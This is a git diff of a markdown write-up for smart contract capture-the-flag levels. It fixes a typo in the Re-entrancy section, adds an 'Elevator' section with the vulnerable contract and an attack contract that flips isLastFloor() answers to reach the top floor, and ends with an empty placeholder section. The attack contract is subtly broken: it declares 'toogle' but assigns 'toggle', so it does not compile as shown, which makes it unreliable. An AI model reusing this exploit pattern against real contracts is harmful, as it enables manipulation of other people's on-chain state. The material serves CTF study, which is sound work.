@@ -15,6 +15,8 @@ Sections:
  - [Force](#7-force)
  - [Valut](#8-valut)
  - [King](#9-king)
+ - [Re-entrancy](#10-re-entrancy)
+ - [Elevator](#11-elevator)
 
 ----
 
@@ -710,7 +712,7 @@ contract Reentrance {
 
 The hack to the contract will be by writing another smart contract that will take advantage of the vulnerability.
 
-Wr create a recursive re-rentrancy loop. In this loop we withdraw the funds before the balanaces are updated. 
+We create a recursive re-rentrancy loop. In this loop we withdraw the funds before the balanaces are updated. 
 
 ####  Solution:
 1. Open Remix and import the smart contract. Change the safemath libary location:
@@ -765,5 +767,93 @@ modifier noReentrancy{
 }
 ``` 
 
+---
+### 11. Elevator 
 
+> This elevator won't let you reach the top of your building. Right?
 
+The goal of the hack is to reach the top of the building. Let's clear some terms and then have a look at the smart contract that we'll be hacking for this step. 
+
+- Interface in solidity: they help to generate an API for the contract so that the smart contracts can communicate.  
+- [Visibility](https://solidity-by-example.org/visibility/ ): defines who can call the function (public, private, internal, external)
+- [Modifiers](https://docs.soliditylang.org/en/v0.8.14/cheatsheet.html?highlight=modifiers#modifiers): how functions will interact with the state on the blockchain (eg: view would allow you to read from the blockchain but not modify). The default is that it will allow to read and change the data on the blockchain. 
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+// interface specifies the name of the fucntion that the object needs to implement
+interface Building {
+  function isLastFloor(uint) external returns (bool);
+}
+
+// the contract to hack 
+contract Elevator {
+  bool public top;
+  uint public floor;
+
+  function goTo(uint _floor) public {
+    Building building = Building(msg.sender);
+
+    if (! building.isLastFloor(_floor)) { //isLastFloor is in the Building contract 
+      floor = _floor;
+      top = building.isLastFloor(floor);
+    }
+  }
+}
+
+``` 
+
+Check which floor you are on:
+```
+await contract.floor()
+``` 
+
+####  Solution:
+1. Open Remix and import the smart contract. 
+2. Create a new smart contract: ElevatorAttack.sol and import the Elevator.sol file. 
+Here's how the attcak contract should look like:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import './Elevator.sol';
+
+contract ElevatorAttack {
+  bool public toogle = true;
+  Elevator public target;
+
+  constructor(address _targetAddress) public {
+    target = Elevator(_targetAddress);
+  }
+  
+  function isLastFloor(uint) public returns (bool){
+    toggle = !toogle;
+    return toogle;
+  }
+  
+  function setTop(uint _floor) public{
+    target.goTo(_floor);
+  }
+}
+
+``` 
+
+3. Deploy the smart contract with the target address
+contract.address()
+
+4. Call the setTop function on Remix with floor number: 10 for example. 
+
+We bascially added a new logic for the interface function because the interface allows us to modify the state. 
+
+---
+### 12. NAME 
+
+> Challange 
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+``` 
